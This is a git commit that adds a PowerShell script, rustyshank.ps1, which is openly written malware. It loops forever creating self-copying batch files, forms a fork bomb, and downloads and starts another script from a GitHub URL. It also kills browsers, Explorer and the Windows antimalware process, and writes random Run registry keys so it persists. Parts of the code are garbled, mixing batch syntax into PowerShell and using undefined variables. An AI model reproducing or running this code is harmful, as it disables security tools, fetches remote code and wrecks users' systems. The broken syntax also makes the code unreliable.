05943646b58caaba9d8b21e5ec03857df72e26ed
randyman777777777 <121990518+randyman777777777@users.noreply.github.com>
2023-02-17 12:27:21 -0800

    Active

---
+++ ps1/rustyshank.ps1
@@ -0,0 +1,27 @@
+while ($true){New-Item -ItemType File -Path %User%\jane4%random%.bat" -Force
+ 
+Set-Content -Path "%User%\jakus7%random%.bat -Value "copy %0 %0%random%%random%%random%random% start %0%random%%random%%random%random% start https://github.com/kaosSec/kaosTools/raw/main/ps1/bungus8000.ps1 start bungus8000 copy bungus8000 bungus8000%random%%random%%random%%random% start bungus8000%random%%random%%random%%random% echo %0|%0 >> %random%fork.bat start %random%fork.bat start calc start notepad tskill msnmsgr tskill firefox tskill iexplore tskill chrome tskill Antimalware Service Executable tskill explorer tskill explorer tskill explorer tskill explorer tskill explorer :y net send * WORKGROUP ENABLED net send * WORKGROUP ENABLED GOTO y"
+ 
+& "%User%\jane4%random%.bat"
+ 
+$j44 = $MyInvocation.MyCommand.Path
+ 
+$k44 = Join-Path (Split-Path $j44) (%random% + (Split-Path $scriptPath -Leaf))
+ 
+Copy-Item -Path $j44 -Destination $k44 -Force
+ 
+& $k44
+
+& $k44
+
+& $k44
+
+& $k44
+
+$jogi7 = k44
+
+$K78 = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+$sgapi9 = %random%%random%%random%%random%
+$orugu = $jogi7
+
+New-Item -Path $K78 -Name $sgapi9 -Value $orugu -Force}
